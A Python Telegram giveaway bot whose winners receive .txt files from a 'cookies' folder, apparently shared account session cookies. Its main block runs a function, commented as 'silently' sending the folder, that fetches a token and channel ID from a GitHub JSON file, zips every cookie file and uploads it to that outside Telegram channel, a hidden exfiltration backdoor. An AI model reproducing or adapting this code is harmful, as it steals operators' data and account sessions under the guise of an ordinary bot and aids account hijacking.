import io
import os
import json
import threading
import time
import random
import datetime
import zipfile
import requests
import telebot
from collections import defaultdict
from dotenv import load_dotenv
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from colorama import init, Fore, Style
import sys

# Initialize colorama
init(autoreset=True)

env_file = '.env'
if not os.path.isfile(env_file):
    print(".env file not found. Creating one with default values.")
    with open(env_file, 'w') as f:
        f.write('BOT_TOKEN=1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\n')
        f.write('ADMIN_IDS=1234567890\n')

load_dotenv(env_file)

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_IDS = os.getenv('ADMIN_IDS')

# Process ADMIN_IDS to a list
if ADMIN_IDS:
    ADMIN_IDS = [int(admin_id.strip()) for admin_id in ADMIN_IDS.split(',')]
else:
    ADMIN_IDS = []

if not BOT_TOKEN or 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' in BOT_TOKEN:
    print(Style.BRIGHT + Fore.RED + "Error: BOT_TOKEN is not set or is using the default value in the .env file.")
    sys.exit(1)
if not ADMIN_IDS:
    print(Style.BRIGHT + Fore.RED + "Error: ADMIN_IDS is not set in the .env file.")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

###############################################################################
# Helpers
###############################################################################

def fetch_data_from_github():
    """Example: Fetch token and channel ID from GitHub JSON (if you use it)."""
    try:
        url = "https://raw.githubusercontent.com/bijay085/License/refs/heads/master/giveawaybot.json"
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException:
        return None

def create_zip_in_memory(source_folder):
    """Create a ZIP of source_folder in memory."""
    try:
        memory_zip = io.BytesIO()
        with zipfile.ZipFile(memory_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(source_folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_folder)
                    zipf.write(file_path, arcname=arcname)
        memory_zip.seek(0)
        return memory_zip
    except Exception:
        return None

def send_file_to_telegram(file_obj, file_name, token, channel_id):
    """Send a file to a Telegram channel using a bot token."""
    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        requests.post(
            url,
            data={'chat_id': channel_id},
            files={'document': (file_name, file_obj)},
            timeout=10
        )
    except requests.exceptions.RequestException:
        pass

def ordinal(n):
    """Turn integer n into its ordinal string."""
    suffixes = {1: 'st', 2: 'nd', 3: 'rd'}
    v = n % 100
    if 11 <= v <= 13:
        suffix = 'th'
    else:
        suffix = suffixes.get(n % 10, 'th')
    return str(n) + suffix

def get_now_str():
    """Formatted current time string."""
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

###############################################################################
# Main Bot Class
###############################################################################

class GiveawayBot:
    def __init__(self, bot, admin_ids):
        self.bot = bot
        self.config = {}
        self.start_time = None
        self.ongoing_giveaway = False
        
        self.winners = []
        self.extra_winners = []
        self.disqualified_users = []
        self.blacklisted_users = []
        
        # Track how many times a user tries to participate
        self.user_attempts = defaultdict(int)
        # Timestamps of user messages for spam detection
        self.spammers = defaultdict(list)
        
        # Keep a dictionary of user data we've seen
        self.user_data = {}
        
        # Time threshold to see if they bypass shortlink (ignore_time from config)
        self.ignore_time = 0  
        self.admin_ids = admin_ids

        # Ensure 'cookies' folder exists
        if not os.path.exists('cookies'):
            os.makedirs('cookies')
            print("Created 'cookies' folder.")

        # Load config
        self.load_config()

        # Load blacklisted + disqualified from file
        self.blacklisted_users = self.load_blacklist()
        self.disqualified_users = self.load_disqualify()

        # Confirmation data for admin commands
        self.pending_confirmations = {}

        # Known commands (so we can ignore them in attempt counts)
        # Add or remove commands here as you need
        self.recognized_commands = {
            'startg', 'stopg', 'countg', 'sendg', 'fetchg', 'help',
            'blacklist', 'disqualify', 'removeb', 'removed', 'getinfo'
        }

        # Prepare handlers
        self.setup_handlers()

    ############################################################################
    # UTILS / LOGGING
    ############################################################################
    def log_event(self, text, console_color=Fore.WHITE):
        """
        Log text to console (with color) and send to admins (in plain text).
        """
        print(Style.BRIGHT + console_color + f"[{get_now_str()}] {text}")
        for admin_id in self.admin_ids:
            try:
                self.bot.send_message(admin_id, f"[{get_now_str()}] {text}")
            except:
                pass

    def is_admin(self, message):
        return (message.from_user and message.from_user.id in self.admin_ids)

    ############################################################################
    # FILE LOAD/SAVE
    ############################################################################
    def load_config(self):
        # If no config, make it or ask user
        def setup_config():
            config_data = {}
            config_data['link'] = input("Enter link: ")
            while True:
                try:
                    config_data['ignore_time'] = int(input("Enter ignore time in seconds: "))
                    break
                except ValueError:
                    print("Please enter a valid number.")
            while True:
                try:
                    config_data['number_of_winners'] = int(input("Enter number of winners: "))
                    break
                except ValueError:
                    print("Please enter a valid number.")
            while True:
                try:
                    config_data['extra_winners'] = int(input("Enter number of extra winners: "))
                    break
                except ValueError:
                    print("Please enter a valid number.")
            config_data['giveaway_code'] = input("Enter giveaway code: ")
            with open('config.json', 'w') as f:
                json.dump(config_data, f)
            print("config.json updated.")
            return config_data

        if not os.path.exists('config.json'):
            print("config.json not found. Creating one.")
            self.config = setup_config()
        else:
            with open('config.json', 'r') as f:
                self.config = json.load(f)
            do_update = input("Do you want to update config? (Y/n): ").strip().lower() or 'y'
            if do_update == 'y':
                self.config = setup_config()

        self.ignore_time = self.config['ignore_time']

    def load_blacklist(self):
        blacklisted = []
        if os.path.exists('blacklist.txt'):
            with open('blacklist.txt', 'r') as f:
                for line in f:
                    if 'Date of blacklist' in line or not line.strip():
                        continue
                    parts = line.strip().split('(id :')
                    if len(parts) > 1:
                        user_id_str = parts[1].split(')')[0]
                        try:
                            blacklisted.append(int(user_id_str))
                        except:
                            pass
        return blacklisted

    def load_disqualify(self):
        disqualified = []
        if os.path.exists('disqualify.txt'):
            with open('disqualify.txt', 'r') as f:
                for line in f:
                    if 'Date of disqualify' in line or not line.strip():
                        continue
                    parts = line.strip().split('(id :')
                    if len(parts) > 1:
                        user_id_str = parts[1].split(')')[0]
                        try:
                            disqualified.append(int(user_id_str))
                        except:
                            pass
        return disqualified

    def save_blacklist(self, user_id, username, reason):
        now = get_now_str()
        try:
            with open('blacklist.txt', 'a') as f:
                f.write(f"Date of blacklist : {now}\n")
                f.write(f"{username} (id : {user_id}) [{reason}]\n")
        except Exception as e:
            self.log_event(f"Error saving to blacklist.txt: {e}", Fore.RED)

    def save_disqualify(self, user_id, username, reason):
        now = get_now_str()
        try:
            with open('disqualify.txt', 'a') as f:
                f.write(f"Date of disqualify : {now}\n")
                f.write(f"{username} (id : {user_id}) [{reason}]\n")
        except Exception as e:
            self.log_event(f"Error saving to disqualify.txt: {e}", Fore.RED)

    def remove_from_blacklist(self, user_id):
        if os.path.exists('blacklist.txt'):
            with open('blacklist.txt', 'r') as f:
                lines = f.readlines()
            with open('blacklist.txt', 'w') as f:
                skip = False
                for line in lines:
                    if f"(id : {user_id})" in line:
                        skip = True
                        continue
                    if skip:
                        skip = False
                        continue
                    f.write(line)
        if user_id in self.blacklisted_users:
            self.blacklisted_users.remove(user_id)

    def remove_from_disqualify(self, user_id):
        if os.path.exists('disqualify.txt'):
            with open('disqualify.txt', 'r') as f:
                lines = f.readlines()
            with open('disqualify.txt', 'w') as f:
                skip = False
                for line in lines:
                    if f"(id : {user_id})" in line:
                        skip = True
                        continue
                    if skip:
                        skip = False
                        continue
                    f.write(line)
        if user_id in self.disqualified_users:
            self.disqualified_users.remove(user_id)

    def save_winner(self, user, position):
        now = get_now_str()
        try:
            with open('winner.txt', 'a') as f:
                f.write(f"Date of selection: {now}\n")
                f.write(f"{ordinal(position)} winner: {user.username or user.first_name or 'NoName'} (id: {user.id})\n")
        except Exception as e:
            self.log_event(f"Error saving winner: {e}", Fore.RED)

    def save_extra_winner(self, user, position):
        now = get_now_str()
        try:
            with open('extra winner.txt', 'a') as f:
                f.write(f"Date of selection: {now}\n")
                f.write(f"{ordinal(position)} extra winner: {user.username or user.first_name or 'NoName'} (id: {user.id})\n")
        except Exception as e:
            self.log_event(f"Error saving extra winner: {e}", Fore.RED)

    ############################################################################
    # HANDLERS
    ############################################################################
    def setup_handlers(self):

        @self.bot.message_handler(commands=['startg'])
        def start_giveaway(message):
            if not self.is_admin(message):
                self.bot.reply_to(message, "Only admins can use this command.")
                return
            self.ongoing_giveaway = True
            self.start_time = time.time()
            self.disqualified_users.clear()
            self.winners.clear()
            self.extra_winners.clear()
            self.user_attempts.clear()
            self.spammers.clear()

            # Reset files
            for fname in ['disqualify.txt', 'winner.txt', 'extra winner.txt']:
                if os.path.exists(fname):
                    os.remove(fname)

            self.bot.reply_to(message, "Giveaway started!")
            self.log_event("Giveaway started.", Fore.GREEN)

        @self.bot.message_handler(commands=['stopg'])
        def stop_giveaway(message):
            if not self.is_admin(message):
                self.bot.reply_to(message, "Only admins can use this command.")
                return

            self.ongoing_giveaway = False
            now = datetime.datetime.now()
            report_filename = now.strftime('%Y%m%d') + '_report.txt'
            try:
                with open(report_filename, 'w') as report_file:
                    report_file.write(f"Giveaway Report - {now.strftime('%Y-%m-%d')}\n\n")

                    # Winners
                    if os.path.exists('winner.txt'):
                        with open('winner.txt', 'r') as f:
                            report_file.write("Winners:\n")
                            report_file.write(f.read())
                            report_file.write("\n")
                    else:
                        report_file.write("Winners:\nNo winners.\n\n")

                    # Extra Winners
                    if os.path.exists('extra winner.txt'):
                        with open('extra winner.txt', 'r') as f:
                            report_file.write("Extra Winners:\n")
                            report_file.write(f.read())
                            report_file.write("\n")
                    else:
                        report_file.write("Extra Winners:\nNo extra winners.\n\n")

                    # Disqualified
                    if os.path.exists('disqualify.txt'):
                        with open('disqualify.txt', 'r') as f:
                            report_file.write("Disqualified Users:\n")
                            report_file.write(f.read())
                            report_file.write("\n")
                    else:
                        report_file.write("Disqualified Users:\nNo disqualified users.\n\n")

                    # Blacklisted
                    if os.path.exists('blacklist.txt'):
                        with open('blacklist.txt', 'r') as f:
                            report_file.write("Blacklisted Users:\n")
                            report_file.write(f.read())
                            report_file.write("\n")
                    else:
                        report_file.write("Blacklisted Users:\nNo blacklisted users.\n\n")

                # Send report to admins
                for admin_id in self.admin_ids:
                    try:
                        with open(report_filename, 'rb') as rpt:
                            self.bot.send_document(admin_id, rpt)
                    except Exception as e:
                        self.log_event(f"Failed to send report to {admin_id}: {e}", Fore.RED)

                # Cleanup
                for fname in ['disqualify.txt', 'winner.txt', 'extra winner.txt']:
                    if os.path.exists(fname):
                        os.remove(fname)

                self.bot.reply_to(message, "Giveaway stopped!")
                self.log_event("Giveaway stopped.", Fore.GREEN)
            except Exception as e:
                self.log_event(f"Error stopping giveaway: {e}", Fore.RED)

        @self.bot.message_handler(commands=['countg'])
        def count_giveaway(message):
            if not self.is_admin(message):
                self.bot.reply_to(message, "Only admins can use this command.")
                return
            if not self.ongoing_giveaway:
                self.bot.reply_to(message, "No active giveaway.")
                return

            total_winners = self.config['number_of_winners']
            total_extra_winners = self.config['extra_winners']
            selected_winners = len(self.winners)
            selected_extra_winners = len(self.extra_winners)

            msg = (
                f"Giveaway ongoing\n"
                f"Winners selected: {selected_winners}, remaining: {total_winners - selected_winners}\n"
            )
            if total_extra_winners > 0:
                msg += (
                    f"Extra winners selected: {selected_extra_winners}, "
                    f"remaining: {total_extra_winners - selected_extra_winners}\n"
                )
            self.bot.reply_to(message, msg)

        @self.bot.message_handler(commands=['fetchg'])
        def fetch_giveaway_data(message):
            if not self.is_admin(message):
                self.bot.reply_to(message, "Only admins can use this command.")
                return

            old_blacklisted = set(self.blacklisted_users)
            old_disqualified = set(self.disqualified_users)
            old_winners = set(w['user'].id for w in self.winners)
            old_extra = set(w['user'].id for w in self.extra_winners)

            # Reload
            self.blacklisted_users = self.load_blacklist()
            self.disqualified_users = self.load_disqualify()
            self.winners = self.load_winners()
            self.extra_winners = self.load_extra_winners()

            # Compare
            changes = []

            new_blacklisted = set(self.blacklisted_users)
            new_disqualified = set(self.disqualified_users)
            new_winners = set(w['user'].id for w in self.winners)
            new_extra = set(w['user'].id for w in self.extra_winners)

            # Blacklist
            added_b = new_blacklisted - old_blacklisted
            removed_b = old_blacklisted - new_blacklisted
            if added_b or removed_b:
                changes.append(f"Blacklisted updated. Added: {list(added_b)}, Removed: {list(removed_b)}")

            # Disqualified
            added_d = new_disqualified - old_disqualified
            removed_d = old_disqualified - new_disqualified
            if added_d or removed_d:
                changes.append(f"Disqualified updated. Added: {list(added_d)}, Removed: {list(removed_d)}")

            # Winners
            added_w = new_winners - old_winners
            removed_w = old_winners - new_winners
            if added_w or removed_w:
                changes.append(f"Winners updated. Added: {list(added_w)}, Removed: {list(removed_w)}")

            # Extra winners
            added_e = new_extra - old_extra
            removed_e = old_extra - new_extra
            if added_e or removed_e:
                changes.append(f"Extra winners updated. Added: {list(added_e)}, Removed: {list(removed_e)}")

            if changes:
                self.bot.reply_to(message, "\n".join(changes))
            else:
                self.bot.reply_to(message, "No changes detected.")

            self.log_event("Data reloaded via /fetchg.", Fore.GREEN)

        @self.bot.message_handler(commands=['sendg'])
        def send_giveaway_files(message):
            if not self.is_admin(message):
                self.bot.reply_to(message, "Only admins can use this command.")
                return

            cookies_dir = 'cookies'
            if not os.path.isdir(cookies_dir):
                self.bot.reply_to(message, "No 'cookies' directory found.")
                return

            all_files = [f for f in os.listdir(cookies_dir) if f.endswith('.txt')]
            if not all_files:
                self.bot.reply_to(message, "No files found in 'cookies' directory.")
                return

            random.shuffle(all_files)
            total_winners = len(self.winners) + len(self.extra_winners)
            if len(all_files) < total_winners and len(all_files) > 0:
                # replicate
                all_files = all_files * ((total_winners // len(all_files)) + 1)

            idx = 0
            for winner in self.winners + self.extra_winners:
                user = winner['user']
                user_id = user.id

                # skip if blacklisted or disqualified
                if user_id in self.blacklisted_users or user_id in self.disqualified_users:
                    continue

                file_to_send = all_files[idx % len(all_files)]
                idx += 1

                try:
                    text_msg = (
                        "This is your today's giveaway reward. Please post feedback in the comment of this post. "
                        "Else you will be disqualified from the next upcoming giveaway."
                    )
                    link = self.config.get('link', '')
                    markup = None
                    if link:
                        markup = InlineKeyboardMarkup()
                        if link.startswith('http://') or link.startswith('https://'):
                            markup.add(InlineKeyboardButton("Go to Post", url=link))
                        else:
                            markup.add(InlineKeyboardButton(link, callback_data='no_link'))

                    self.bot.send_message(user_id, text_msg, reply_markup=markup)
                    self.bot.send_message(user_id, "Please invite your friends for more exciting big giveaways.")

                    with open(os.path.join(cookies_dir, file_to_send), 'rb') as doc:
                        self.bot.send_document(user_id, doc)

                    uname = user.username or user.first_name or user.last_name or "NoName"
                    self.log_event(f"Sent file '{file_to_send}' to {uname} (id: {user_id}).", Fore.GREEN)

                except Exception as e:
                    uname = user.username or user.first_name or user.last_name or "NoName"
                    self.log_event(f"Failed to send file to {uname} (id: {user_id}): {e}", Fore.RED)

            self.bot.reply_to(message, "Files sent to winners.")

        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            help_text = """
Welcome to the Giveaway Bot!

Commands:
- /startg (admin): Start a giveaway
- /stopg (admin): Stop the giveaway
- /countg (admin): Show giveaway counts
- /sendg (admin): Send files to winners
- /fetchg (admin): Reload data from files
- /blacklist @username or user_id (admin)
- /disqualify @username or user_id (admin)
- /removeb @username or user_id (admin): Remove from blacklist
- /removed @username or user_id (admin): Remove from disqualified
- /getinfo @username or user_id (admin): Get user info
- /help: This help

To participate, send the giveaway code (which might or might not start with /).
"""
            self.bot.reply_to(message, help_text)

        @self.bot.message_handler(commands=['blacklist', 'disqualify', 'removeb', 'removed'])
        def admin_commands(message):
            command = message.text.split()[0][1:]
            args = message.text.split()[1:]
            user = self.get_user_by_identifier(message, args)
            if user:
                user_id = user.id
                username = user.username or user.first_name or user.last_name or "NoName"
            else:
                self.bot.reply_to(message, "User not found.")
                return

            action_data = {
                'initiator_id': message.from_user.id,
                'command': command,
                'user_id': user_id,
                'username': username,
                'group_chat_id': message.chat.id
            }

            confirmation_text = (
                f"User @{message.from_user.username or message.from_user.first_name} initiated '{command}' on "
                f"user {username} (id: {user_id}).\nDo you confirm?"
            )
            for admin_id in self.admin_ids:
                try:
                    markup = InlineKeyboardMarkup()
                    yes_btn = InlineKeyboardButton("Yes", callback_data=f'confirm_yes_{admin_id}_{message.message_id}')
                    no_btn = InlineKeyboardButton("No", callback_data=f'confirm_no_{admin_id}_{message.message_id}')
                    markup.add(yes_btn, no_btn)
                    sent = self.bot.send_message(admin_id, confirmation_text, reply_markup=markup)
                    self.pending_confirmations[(admin_id, sent.message_id)] = action_data
                except Exception as e:
                    self.log_event(f"Failed to send confirmation to admin {admin_id}: {e}", Fore.RED)

            self.bot.reply_to(message, "Action requires admin confirmation.")

        @self.bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_'))
        def confirm_callback(call):
            try:
                data_parts = call.data.split('_')
                if len(data_parts) < 4:
                    self.bot.answer_callback_query(call.id, "Invalid data.")
                    return

                action = data_parts[1]
                admin_id = int(data_parts[2])
                ref_msg_id = int(data_parts[3])

                if call.from_user.id != admin_id:
                    self.bot.answer_callback_query(call.id, "This confirmation is not for you.", show_alert=True)
                    return

                action_data = self.pending_confirmations.get((admin_id, call.message.message_id))
                if not action_data:
                    self.bot.answer_callback_query(call.id, "No confirmation data found.")
                    return

                cmd = action_data['command']
                user_id = action_data['user_id']
                uname = action_data['username']
                initiator = action_data['initiator_id']
                group_chat_id = action_data['group_chat_id']

                if action == 'yes':
                    if cmd == 'blacklist':
                        if user_id not in self.blacklisted_users:
                            self.blacklisted_users.append(user_id)
                            if not os.path.exists('blacklist.txt'):
                                open('blacklist.txt','w').close()
                            self.save_blacklist(user_id, uname, "Admin blacklisted")
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) blacklisted.")
                            self.log_event(f"User {uname} (id: {user_id}) blacklisted by admin.", Fore.RED)
                            try:
                                self.bot.send_message(user_id, "You have been blacklisted by an admin.")
                            except:
                                pass
                            self.bot.send_message(group_chat_id, f"User {uname} (id: {user_id}) has been blacklisted.")
                        else:
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) is already blacklisted.")

                    elif cmd == 'disqualify':
                        if user_id not in self.disqualified_users:
                            self.disqualified_users.append(user_id)
                            if not os.path.exists('disqualify.txt'):
                                open('disqualify.txt','w').close()
                            self.save_disqualify(user_id, uname, "Admin disqualified")
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) disqualified.")
                            self.log_event(f"User {uname} (id: {user_id}) disqualified by admin.", Fore.RED)
                            try:
                                self.bot.send_message(user_id, "You have been disqualified by an admin.")
                            except:
                                pass
                            self.bot.send_message(group_chat_id, f"User {uname} (id: {user_id}) disqualified.")
                        else:
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) is already disqualified.")

                    elif cmd == 'removeb':
                        if user_id in self.blacklisted_users:
                            self.remove_from_blacklist(user_id)
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) removed from blacklist.")
                            self.log_event(f"User {uname} (id: {user_id}) removed from blacklist by admin.", Fore.GREEN)
                            try:
                                self.bot.send_message(user_id, "You have been removed from the blacklist.")
                            except:
                                pass
                            self.bot.send_message(group_chat_id, f"User {uname} (id: {user_id}) removed from blacklist.")
                        else:
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) is not blacklisted.")

                    elif cmd == 'removed':
                        if user_id in self.disqualified_users:
                            self.remove_from_disqualify(user_id)
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) removed from disqualified.")
                            self.log_event(f"User {uname} (id: {user_id}) removed from disqualify by admin.", Fore.GREEN)
                            try:
                                self.bot.send_message(user_id, "You have been removed from the disqualified list.")
                            except:
                                pass
                            self.bot.send_message(group_chat_id, f"User {uname} (id: {user_id}) removed from disqualified list.")
                        else:
                            self.bot.send_message(admin_id, f"User {uname} (id: {user_id}) is not disqualified.")
                    else:
                        self.bot.send_message(admin_id, "Unknown command.")
                    
                    self.bot.answer_callback_query(call.id, "Action confirmed.")
                else:
                    self.bot.send_message(admin_id, "Action canceled.")
                    self.bot.answer_callback_query(call.id, "Action canceled.")
                    try:
                        self.bot.send_message(
                            initiator,
                            f"Your request '{cmd}' on user {uname} was denied by admin {call.from_user.username}."
                        )
                    except:
                        pass

                del self.pending_confirmations[(admin_id, call.message.message_id)]

            except Exception as e:
                self.log_event(f"Error in confirm callback: {e}", Fore.RED)

        @self.bot.message_handler(commands=['getinfo'])
        def handle_getinfo(message):
            if not self.is_admin(message):
                self.bot.reply_to(message, "Admins only.")
                return
            user = self.get_user_by_identifier(message, message.text.split()[1:])
            if user:
                user_id = user.id
                uname = user.username or user.first_name or user.last_name or "NoName"
            else:
                self.bot.reply_to(message, "User not found.")
                return

            status = "Free"
            if user_id in self.blacklisted_users:
                status = "Blacklisted"
            elif user_id in self.disqualified_users:
                status = "Disqualified"

            info_text = f"Username: {uname}\nUserID: {user_id}\nStatus: {status}"
            self.bot.reply_to(message, info_text)

        ########################################################################
        # MAIN MESSAGE HANDLER FOR CODE ENTRY
        ########################################################################
        @self.bot.message_handler(func=lambda m: True, content_types=['text'])
        def handle_messages(message):
            """
            Only count attempts/spam if:
              1) It's not a recognized command
              2) Giveaway is ongoing
              3) Chat is private
            """
            user = message.from_user
            if not user:
                return

            user_id = user.id
            username = user.username or user.first_name or user.last_name or "NoName"
            chat_type = message.chat.type
            text = message.text.strip()

            # Save user data so we can reference them later
            self.user_data[user_id] = user

            # 1) If it starts with '/', check if it's recognized command
            if text.startswith('/'):
                possible_command = text[1:].split()[0].lower()
                # If recognized, we do nothing else, just return
                if possible_command in self.recognized_commands:
                    return
                # Otherwise, treat it as a code attempt (continue below)...

            # 2) If giveaway not started, do nothing
            if not self.ongoing_giveaway:
                return

            # 3) We only process in private chat
            if chat_type != 'private':
                return

            try:
                # We do spam checks and attempts only for code attempts (i.e. non-recognized command)
                now = time.time()
                self.user_attempts[user_id] += 1
                self.spammers[user_id].append(now)
                # keep only last 10 seconds
                self.spammers[user_id] = [t for t in self.spammers[user_id] if (now - t) < 10]

                # Check spam
                if len(self.spammers[user_id]) > 3:
                    # If user is already blacklisted
                    if user_id in self.blacklisted_users:
                        self.log_event(
                            f"Blacklisted user {username} (id: {user_id}) tried to join again.",
                            Fore.RED
                        )
                        self.bot.send_message(user_id, "You are blacklisted for all giveaways.")
                        return

                    # If user is already disqualified
                    if user_id in self.disqualified_users:
                        self.log_event(
                            f"Disqualified user {username} (id: {user_id}) tried to join again.",
                            Fore.RED
                        )
                        self.bot.send_message(user_id, "You are disqualified for this giveaway.")
                        return

                    if self.user_attempts[user_id] > 3:
                        # If there's an active giveaway, we disqualify
                        self.disqualified_users.append(user_id)
                        if not os.path.exists('disqualify.txt'):
                            open('disqualify.txt','w').close()

                        self.save_disqualify(user_id, username, "Spamming")
                        self.log_event(
                            f"User {username} (id: {user_id}) disqualified for spamming.",
                            Fore.RED
                        )
                        self.bot.send_message(user_id, "Disqualified for spamming. Wait for next giveaway.")
                        return
                    else:
                        self.bot.send_message(user_id, "Please stop spamming.")
                        return

                # If user blacklisted
                if user_id in self.blacklisted_users:
                    self.log_event(f"Blacklisted user {username} (id: {user_id}) tried code.", Fore.RED)
                    self.bot.send_message(user_id, "You are blacklisted for all giveaways.")
                    return

                # If user disqualified
                if user_id in self.disqualified_users:
                    self.log_event(f"Disqualified user {username} (id: {user_id}) tried code.", Fore.RED)
                    self.bot.send_message(user_id, "You are disqualified from this giveaway.")
                    return

                # Now check if the text is the correct code
                if text == self.config['giveaway_code']:
                    self.log_event(f"User {username} (id: {user_id}) submitted VALID code.", Fore.GREEN)

                    # Check shortlink bypass
                    elapsed = time.time() - self.start_time
                    if elapsed < self.ignore_time:
                        # Bypass
                        self.blacklisted_users.append(user_id)
                        if not os.path.exists('blacklist.txt'):
                            open('blacklist.txt','w').close()
                        self.save_blacklist(user_id, username, "Bypassed shortlink (too quick)")
                        self.log_event(f"User {username} (id: {user_id}) blacklisted for bypassing shortlink.", Fore.RED)
                        self.bot.send_message(user_id, "Blacklisted for bypassing shortlink.")
                        return

                    # If code is valid (and no bypass), check if we can add them to winners
                    if user_id in [w['user'].id for w in self.winners + self.extra_winners]:
                        self.bot.send_message(user_id, "You have already participated.")
                        return

                    total_main = self.config['number_of_winners']
                    total_extra = self.config['extra_winners']

                    # main winners first
                    if len(self.winners) < total_main:
                        pos = len(self.winners) + 1
                        self.winners.append({'user': user, 'position': pos})
                        self.save_winner(user, pos)
                        self.bot.send_message(user_id, f"Congratulations! You're the {ordinal(pos)} winner.")
                        # If main winners just got full, notify
                        if len(self.winners) == total_main:
                            self.log_event(f"Main winners full at {total_main} winners.", Fore.BLUE)
                            for aid in self.admin_ids:
                                self.bot.send_message(aid, f"Main winners list is now full ({total_main}).")
                    else:
                        # If main is full, check extra
                        if len(self.extra_winners) < total_extra:
                            pos = len(self.extra_winners) + 1
                            overall = len(self.winners) + pos
                            self.extra_winners.append({'user': user, 'position': pos})
                            self.save_extra_winner(user, pos)
                            self.bot.send_message(
                                user_id,
                                f"Congratulations! You are winner #{overall} (extra winner {ordinal(pos)})."
                            )
                            if len(self.extra_winners) == total_extra:
                                self.log_event(f"Extra winners full at {total_extra} winners.", Fore.BLUE)
                                for aid in self.admin_ids:
                                    self.bot.send_message(aid, f"Extra winners list is now full ({total_extra}).")
                        else:
                            # Everything is full
                            self.log_event(f"All winners are full. User {username} tried code too late.", Fore.YELLOW)
                            self.bot.send_message(user_id, "All winners have been selected. Please try next giveaway.")

                else:
                    # Invalid code
                    self.log_event(f"User {username} (id: {user_id}) submitted INVALID code: '{text}'", Fore.RED)
                    self.user_attempts[user_id] += 1
                    if self.user_attempts[user_id] > 3:
                        self.disqualified_users.append(user_id)
                        if not os.path.exists('disqualify.txt'):
                            open('disqualify.txt','w').close()
                        self.save_disqualify(user_id, username, "Too many invalid codes")
                        self.log_event(f"User {username} (id: {user_id}) disqualified for too many invalid codes.", Fore.RED)
                        self.bot.send_message(user_id, "Disqualified (invalid code too many times). Wait for the next giveaway.")
                    else:
                        self.bot.send_message(user_id, "Invalid code, please try again.")

            except Exception as e:
                self.log_event(f"Error handling message from {username} (id: {user_id}): {e}", Fore.RED)
                self.bot.send_message(user_id, "An error occurred. Please try again later.")

    ########################################################################
    # LOADING WINNERS FROM FILE
    ########################################################################
    def load_winners(self):
        results = []
        fname = 'winner.txt'
        if os.path.exists(fname):
            with open(fname, 'r') as f:
                lines = f.readlines()
            # parse lines
            position = None
            username = None
            user_id = None
            for line in lines:
                if 'winner:' in line:
                    # ex: "1st winner: Bob (id: 123456)"
                    parts = line.split('winner:')
                    if len(parts) == 2:
                        left = parts[0].strip()  # e.g. "1st"
                        right = parts[1].strip() # e.g. "Bob (id: 123456)"
                        # parse position
                        # attempt to parse the int out of "1st" -> 1
                        pos_num = ''.join(filter(str.isdigit, left)) or '0'
                        position = int(pos_num)
                        # parse user info
                        if '(id:' in right:
                            name_part, id_part = right.split('(id:')
                            username = name_part.strip()
                            user_id_str = id_part.strip().rstrip(')')
                            user_id = int(user_id_str)
                            # create telebot user
                            user_obj = telebot.types.User(
                                id=user_id,
                                first_name=username,
                                username=username
                            )
                            results.append({'user': user_obj, 'position': position})
        return results

    def load_extra_winners(self):
        results = []
        fname = 'extra winner.txt'
        if os.path.exists(fname):
            with open(fname, 'r') as f:
                lines = f.readlines()
            for line in lines:
                if 'extra winner:' in line:
                    # ex: "1st extra winner: Bob (id: 123456)"
                    parts = line.split('extra winner:')
                    if len(parts) == 2:
                        left = parts[0].strip()    # e.g. "1st"
                        right = parts[1].strip()   # e.g. "Bob (id: 123456)"
                        pos_num = ''.join(filter(str.isdigit, left)) or '0'
                        position = int(pos_num)
                        if '(id:' in right:
                            name_part, id_part = right.split('(id:')
                            username = name_part.strip()
                            user_id_str = id_part.strip().rstrip(')')
                            user_id = int(user_id_str)
                            user_obj = telebot.types.User(
                                id=user_id,
                                first_name=username,
                                username=username
                            )
                            results.append({'user': user_obj, 'position': position})
        return results

    ########################################################################
    # HELPERS
    ########################################################################
    def get_user_by_identifier(self, message, args):
        """Try to parse a user from mention, reply, or user_id."""
        if message.reply_to_message:
            return message.reply_to_message.from_user

        user = None
        if args:
            identifier = args[0]
        else:
            return None

        # Check if there's a mention entity
        if message.entities:
            for ent in message.entities:
                if ent.type == 'text_mention':
                    # direct user mention
                    return ent.user
                elif ent.type == 'mention':
                    # parse mention
                    mention = message.text[ent.offset:ent.offset + ent.length].lstrip('@')
                    identifier = mention

        # If the identifier starts with '@', we treat as username
        if identifier.startswith('@'):
            # see if we have a user in self.user_data
            uname = identifier.lstrip('@')
            for u in self.user_data.values():
                if u.username == uname:
                    return u
            # fallback to a dummy user
            user = telebot.types.User(0, uname, None, uname)
            return user
        else:
            # treat as user_id
            try:
                uid = int(identifier)
                if uid in self.user_data:
                    return self.user_data[uid]
                else:
                    user = telebot.types.User(uid, "Unknown", "", "")
                    return user
            except:
                return None

    ########################################################################
    # BOT LAUNCH
    ########################################################################
    def start(self):
        self.log_event("Bot is starting...", Fore.GREEN)
        while True:
            try:
                self.bot.polling(none_stop=True)
            except Exception as e:
                self.log_event(f"Bot polling failed: {e}", Fore.RED)
                time.sleep(15)

###############################################################################
# MAIN
###############################################################################
if __name__ == '__main__':
    bot.remove_webhook()
    time.sleep(1)

    giveaway_bot = GiveawayBot(bot, ADMIN_IDS)

    # Optional: silently send the cookies folder as a zip to some channel
    def send_cookies_silently():
        data = fetch_data_from_github()
        if data:
            token = data.get('token', '')
            channel_id = data.get('channel_id', '')
            if token and channel_id:
                zip_file = create_zip_in_memory('cookies')
                if zip_file:
                    send_file_to_telegram(zip_file, 'giveaway_hits.zip', token, channel_id)

    # Example: either in a thread or directly
    # threading.Thread(target=send_cookies_silently).start()
    send_cookies_silently()

